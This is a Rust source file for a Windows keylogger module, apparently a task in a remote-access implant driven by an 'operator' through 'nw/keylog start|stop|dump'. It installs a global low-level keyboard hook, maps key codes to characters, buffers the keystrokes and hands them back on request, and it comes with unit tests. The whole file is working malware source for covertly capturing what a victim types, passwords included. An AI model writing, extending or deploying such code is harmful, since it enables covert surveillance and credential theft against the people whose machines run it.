//! Keyboard capture via a low-level Windows hook.
//!
//! Operator surface is `nw/keylog <start|stop|dump>`:
//!
//! ```text
//! nw/keylog start   # install a WH_KEYBOARD_LL hook on a dedicated thread
//! nw/keylog dump    # drain captured keystrokes since the last dump
//! nw/keylog stop    # remove the hook and join its thread
//! ```
//!
//! `WH_KEYBOARD_LL` dispatches to the thread that installed it, so the callback
//! reads a thread-local sink instead of a global — one hook at a time, no
//! shared mutable statics.
//!
//! Capture is bounded: the recorder keeps the most recent
//! [`DEFAULT_CAPACITY`] bytes and discards the oldest on overflow, so a
//! forgotten keylogger cannot exhaust memory.

use std::sync::{Arc, Mutex};

/// Bytes retained by a running capture before the oldest are discarded.
pub const DEFAULT_CAPACITY: usize = 256 * 1024;

/// Bounded keystroke buffer.
#[derive(Debug)]
pub struct Recorder {
    buffer: Vec<u8>,
    capacity: usize,
}

impl Recorder {
    /// A recorder retaining at most `capacity` bytes.
    pub fn new(capacity: usize) -> Self {
        Self {
            buffer: Vec::new(),
            capacity: capacity.max(1),
        }
    }

    /// Append one byte, dropping the oldest when full.
    pub fn record(&mut self, byte: u8) {
        if self.buffer.len() == self.capacity {
            self.buffer.remove(0);
        }
        self.buffer.push(byte);
    }

    /// Append a string's bytes.
    pub fn record_str(&mut self, text: &str) {
        for byte in text.bytes() {
            self.record(byte);
        }
    }

    /// Take everything captured so far, leaving the recorder empty.
    pub fn drain(&mut self) -> Vec<u8> {
        std::mem::take(&mut self.buffer)
    }

    /// Bytes currently buffered.
    pub fn len(&self) -> usize {
        self.buffer.len()
    }

    pub fn is_empty(&self) -> bool {
        self.buffer.is_empty()
    }
}

/// Translate a virtual-key code to the character it produces.
///
/// `shift` reflects the shift key at the moment of the event. This covers the
/// keys an operator actually reads back — letters, digits and the common
/// punctuation — rather than every key Windows can report.
///
/// ponytail: no `ToUnicodeEx` + full keyboard-state dance. That needs a live
/// keyboard layout buffer per event; this handles the Latin-1 set directly.
/// Add layout translation if you need non-US layouts.
pub fn key_to_char(vk: u32, shift: bool) -> Option<char> {
    // Letters and digits map straight through on a Latin layout.
    if (0x30..=0x39).contains(&vk) {
        return Some(char::from_digit(vk - 0x30, 10).expect("digit range"));
    }
    if (0x41..=0x5A).contains(&vk) {
        // Virtual-key codes for letters are the uppercase ASCII values, so
        // lowercase is the +0x20 form.
        let code = if shift { vk } else { vk + 0x20 };
        return char::from_u32(code);
    }

    Some(match (vk, shift) {
        (0x08, _) => '\u{08}', // backspace
        (0x09, _) => '\t',     // tab
        (0x0D, _) => '\r',     // enter
        (0x20, _) => ' ',      // space

        (0xBA, false) => ';',
        (0xBA, true) => ':',
        (0xBB, false) => '=',
        (0xBB, true) => '+',
        (0xBC, false) => ',',
        (0xBC, true) => '<',
        (0xBD, false) => '-',
        (0xBD, true) => '_',
        (0xBE, false) => '.',
        (0xBE, true) => '>',
        (0xBF, false) => '/',
        (0xBF, true) => '?',
        (0xC0, false) => '`',
        (0xC0, true) => '~',
        (0xDB, false) => '[',
        (0xDB, true) => '{',
        (0xDC, false) => '\\',
        (0xDC, true) => '|',
        (0xDD, false) => ']',
        (0xDD, true) => '}',
        (0xDE, false) => '\'',
        (0xDE, true) => '"',

        _ => return None,
    })
}

/// A parsed keylogging operation.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Operation {
    Start,
    Stop,
    Dump,
}

/// Parse keylogging task arguments.
pub fn parse_operation(args: &[String]) -> Result<Operation, String> {
    let Some(verb) = args.first().map(|s| s.trim().to_ascii_lowercase()) else {
        return Err("usage: keylog <start|stop|dump>".into());
    };
    if !args[1..].is_empty() {
        return Err("usage: keylog <start|stop|dump>".into());
    }
    match verb.as_str() {
        "start" => Ok(Operation::Start),
        "stop" => Ok(Operation::Stop),
        "dump" | "fetch" => Ok(Operation::Dump),
        other => Err(format!(
            "unknown keylog action {other:?} (expected start, stop or dump)"
        )),
    }
}

/// Shared state for the running capture.
#[derive(Default)]
pub struct KeylogState {
    inner: Mutex<Inner>,
}

#[derive(Default)]
struct Inner {
    // Only the hook thread touches these, so on hosts without a Windows hook
    // they are written by nothing.
    #[cfg_attr(not(target_os = "windows"), allow(dead_code))]
    recorder: Option<Arc<Mutex<Recorder>>>,
    #[cfg_attr(not(target_os = "windows"), allow(dead_code))]
    thread: Option<std::thread::JoinHandle<()>>,
    #[cfg_attr(not(target_os = "windows"), allow(dead_code))]
    thread_id: Option<u32>,
}

impl KeylogState {
    /// A state with no capture running.
    pub fn new() -> Self {
        Self::default()
    }

    /// Whether a hook is currently installed.
    pub fn is_running(&self) -> bool {
        self.inner.lock().expect("keylog state").thread.is_some()
    }
}

/// Run a parsed operation against the shared state.
pub fn execute(state: &Arc<KeylogState>, operation: Operation) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    {
        windows::execute(state, operation)
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = state;
        let verb = match operation {
            Operation::Start => "start",
            Operation::Stop => "stop",
            Operation::Dump => "dump",
        };
        Err(format!(
            "keylog {verb} is Windows-only (running on {})",
            std::env::consts::OS
        ))
    }
}

#[cfg(target_os = "windows")]
mod windows {
    use super::*;
    use std::cell::RefCell;
    use windows_sys::Win32::Foundation::{HINSTANCE, LPARAM, LRESULT, WPARAM};
    use windows_sys::Win32::System::Threading::GetCurrentThreadId;
    use windows_sys::Win32::UI::Input::KeyboardAndMouse::GetAsyncKeyState;
    use windows_sys::Win32::UI::WindowsAndMessaging::{
        CallNextHookEx, GetMessageW, HC_ACTION, KBDLLHOOKSTRUCT, LLKHF_INJECTED, MSG,
        PostThreadMessageW, SetWindowsHookExW, UnhookWindowsHookEx, WH_KEYBOARD_LL, WM_KEYDOWN,
        WM_QUIT,
    };

    thread_local! {
        /// The hook callback runs on the installing thread, so this is the
        /// only place a capture's recorder needs to be reachable.
        static SINK: RefCell<Option<Arc<Mutex<Recorder>>>> = const { RefCell::new(None) };
    }

    const VK_SHIFT: i32 = 0x10;

    /// Low-level keyboard hook. Returns the input unchanged after recording.
    unsafe extern "system" fn keyboard_hook(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
        if code == HC_ACTION as i32 && wparam as u32 == WM_KEYDOWN {
            // SAFETY: with HC_ACTION and WM_KEYDOWN, `lparam` points at a
            // KBDLLHOOKSTRUCT valid for the duration of this callback.
            let event = unsafe { &*(lparam as *const KBDLLHOOKSTRUCT) };
            let vk = event.vkCode;
            // Synthesised input (other automation) is noise for this purpose.
            if vk < 0xFF && event.flags & LLKHF_INJECTED == 0 {
                // SAFETY: querying a key state is always valid.
                let shift = unsafe { GetAsyncKeyState(VK_SHIFT) < 0 };
                if let Some(ch) = key_to_char(vk, shift) {
                    SINK.with(|sink| {
                        if let Some(recorder) = sink.borrow().as_ref()
                            && let Ok(mut recorder) = recorder.lock()
                        {
                            recorder.record(ch as u8);
                        }
                    });
                }
            }
        }
        // SAFETY: pass every event on untouched, as a low-level hook must.
        unsafe { CallNextHookEx(std::ptr::null_mut(), code, wparam, lparam) }
    }

    /// Install the hook on a dedicated pump thread; returns its thread id.
    fn spawn_hook(
        recorder: Arc<Mutex<Recorder>>,
    ) -> Result<(u32, std::thread::JoinHandle<()>), String> {
        let (ready_tx, ready_rx) = std::sync::mpsc::channel();

        let handle = std::thread::Builder::new()
            .name("nw-keylog".to_owned())
            .spawn(move || {
                SINK.with(|sink| *sink.borrow_mut() = Some(Arc::clone(&recorder)));

                // SAFETY: a null module name resolves to this process image,
                // which is where the low-level callback lives.
                let module: HINSTANCE = unsafe {
                    windows_sys::Win32::System::LibraryLoader::GetModuleHandleW(std::ptr::null())
                };
                // SAFETY: `keyboard_hook` is a valid HOOKPROC for a global hook.
                let hook =
                    unsafe { SetWindowsHookExW(WH_KEYBOARD_LL, Some(keyboard_hook), module, 0) };
                if hook.is_null() {
                    let _ = ready_tx.send(Err(format!(
                        "SetWindowsHookEx failed: {}",
                        std::io::Error::last_os_error()
                    )));
                    return;
                }

                let thread_id = unsafe { GetCurrentThreadId() };
                if ready_tx.send(Ok(thread_id)).is_err() {
                    // The caller gave up; do not leak the hook.
                    // SAFETY: `hook` was just installed on this thread.
                    unsafe { UnhookWindowsHookEx(hook) };
                    return;
                }

                // A low-level hook is only dispatched while the installing
                // thread pumps messages, so this loop is the hook's lifetime.
                let mut message: MSG = unsafe { std::mem::zeroed() };
                // SAFETY: `message` is a valid, zeroed MSG for the duration.
                while unsafe { GetMessageW(&mut message, std::ptr::null_mut(), 0, 0) } > 0 {
                    // Messages are only pumped for the hook to run; they are
                    // deliberately not dispatched, as this thread owns no UI.
                }

                // SAFETY: `hook` belongs to this thread and is removed once.
                unsafe { UnhookWindowsHookEx(hook) };
                SINK.with(|sink| sink.borrow_mut().take());
            })
            .map_err(|e| format!("spawn keylog thread: {e}"))?;

        match ready_rx.recv() {
            Ok(Ok(thread_id)) => Ok((thread_id, handle)),
            Ok(Err(e)) => {
                let _ = handle.join();
                Err(e)
            }
            // The thread exited before reporting, so it will not be joined.
            Err(_) => {
                let _ = handle.join();
                Err("keylog thread exited before installing the hook".into())
            }
        }
    }

    pub(super) fn execute(
        state: &Arc<KeylogState>,
        operation: Operation,
    ) -> Result<String, String> {
        let mut inner = state.inner.lock().expect("keylog state");

        match operation {
            Operation::Start => {
                if inner.thread.is_some() {
                    return Err("keylogging is already running".into());
                }
                let recorder = Arc::new(Mutex::new(Recorder::new(DEFAULT_CAPACITY)));
                let (thread_id, handle) = spawn_hook(Arc::clone(&recorder))?;
                inner.recorder = Some(recorder);
                inner.thread_id = Some(thread_id);
                inner.thread = Some(handle);
                Ok("keylogging started\n".to_owned())
            }
            Operation::Stop => {
                let (Some(thread_id), Some(handle)) = (inner.thread_id.take(), inner.thread.take())
                else {
                    return Err("keylogging is not running".into());
                };
                // SAFETY: `thread_id` came from a live pump thread we own.
                unsafe { PostThreadMessageW(thread_id, WM_QUIT, 0, 0) };
                let _ = handle.join();
                inner.recorder = None;
                Ok("keylogging stopped\n".to_owned())
            }
            Operation::Dump => {
                let Some(recorder) = inner.recorder.as_ref() else {
                    return Err("keylogging is not running".into());
                };
                let captured = {
                    let mut recorder = recorder.lock().expect("keylog recorder");
                    recorder.drain()
                };
                if captured.is_empty() {
                    return Ok("(no keystrokes captured)\n".to_owned());
                }
                Ok(String::from_utf8_lossy(&captured).into_owned())
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn args(list: &[&str]) -> Vec<String> {
        list.iter().map(|s| (*s).to_owned()).collect()
    }

    #[test]
    fn operations_parse() {
        assert_eq!(
            parse_operation(&args(&["start"])).unwrap(),
            Operation::Start
        );
        assert_eq!(parse_operation(&args(&["stop"])).unwrap(), Operation::Stop);
        assert_eq!(parse_operation(&args(&["dump"])).unwrap(), Operation::Dump);
        assert_eq!(parse_operation(&args(&["fetch"])).unwrap(), Operation::Dump);
        assert!(parse_operation(&args(&["START"])).is_ok());
    }

    #[test]
    fn malformed_commands_report_usage() {
        for bad in [vec![], args(&["record"]), args(&["start", "extra"])] {
            assert!(parse_operation(&bad).is_err(), "rejected: {bad:?}");
        }
    }

    #[test]
    fn letters_digits_and_whitespace_translate() {
        assert_eq!(key_to_char(0x41, false), Some('a'));
        assert_eq!(key_to_char(0x41, true), Some('A'));
        assert_eq!(key_to_char(0x5A, true), Some('Z'));
        assert_eq!(key_to_char(0x30, false), Some('0'));
        assert_eq!(key_to_char(0x39, false), Some('9'));
        assert_eq!(key_to_char(0x20, false), Some(' '));
        assert_eq!(key_to_char(0x0D, false), Some('\r'));
        assert_eq!(key_to_char(0x09, false), Some('\t'));
        assert_eq!(key_to_char(0x08, false), Some('\u{8}'));
    }

    #[test]
    fn punctuation_respects_shift() {
        assert_eq!(key_to_char(0xBE, false), Some('.'));
        assert_eq!(key_to_char(0xBE, true), Some('>'));
        assert_eq!(key_to_char(0xBF, false), Some('/'));
        assert_eq!(key_to_char(0xBF, true), Some('?'));
        assert_eq!(key_to_char(0xDB, false), Some('['));
        assert_eq!(key_to_char(0xDB, true), Some('{'));
    }

    #[test]
    fn non_typing_keys_are_dropped() {
        // Arrow keys, F-keys and friends must not pollute the capture.
        for vk in [0x25, 0x26, 0x70, 0x1B, 0x12] {
            assert_eq!(key_to_char(vk, false), None, "vk {vk:#x}");
        }
    }

    #[test]
    fn recorder_drains_what_it_captured() {
        let mut recorder = Recorder::new(64);
        recorder.record_str("hunter2");
        assert_eq!(recorder.len(), 7);
        assert_eq!(recorder.drain(), b"hunter2".to_vec());
        assert!(recorder.is_empty());
        assert!(recorder.drain().is_empty());
    }

    #[test]
    fn recorder_discards_the_oldest_when_full() {
        let mut recorder = Recorder::new(4);
        recorder.record_str("abcdef");
        assert_eq!(recorder.drain(), b"cdef".to_vec());
    }

    #[test]
    fn recorder_survives_a_zero_capacity() {
        let mut recorder = Recorder::new(0);
        recorder.record_str("ab");
        assert_eq!(recorder.drain(), b"b".to_vec());
    }

    #[test]
    fn a_fresh_state_reports_nothing_running() {
        assert!(!KeylogState::new().is_running());
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn execution_reports_windows_only_off_windows() {
        let state = Arc::new(KeylogState::new());
        for op in [Operation::Start, Operation::Stop, Operation::Dump] {
            let err = execute(&state, op).unwrap_err();
            assert!(err.contains("Windows-only"), "unexpected error: {err}");
        }
        assert!(!state.is_running());
    }
}
